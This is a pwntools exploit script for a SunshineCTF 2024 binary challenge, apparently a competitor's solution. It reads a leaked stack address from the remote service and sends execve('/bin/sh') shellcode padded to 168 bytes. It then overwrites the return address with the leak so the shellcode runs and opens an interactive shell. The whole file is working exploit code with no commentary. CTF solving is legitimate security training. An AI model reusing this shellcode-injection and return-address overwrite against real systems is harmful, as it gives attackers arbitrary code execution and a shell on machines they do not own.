#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT =  24603

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)
    

def exploit(p,e):
    
    ru(p,b"Speed limit: ")

    easy_shellcode = asm("""
        movabs r15, 0x68732f6e69622f
        push r15
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov eax, 0x3b
        syscall
    """)


    pad = easy_shellcode + b"\x90" * (168 - len(easy_shellcode))
    stack_leak = int(rl(p).strip(b"\n"),16)

    log.info(f"Recieved stack leak {hex(stack_leak)}");

    chain = p64(stack_leak)

    p.sendline(pad+chain)

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
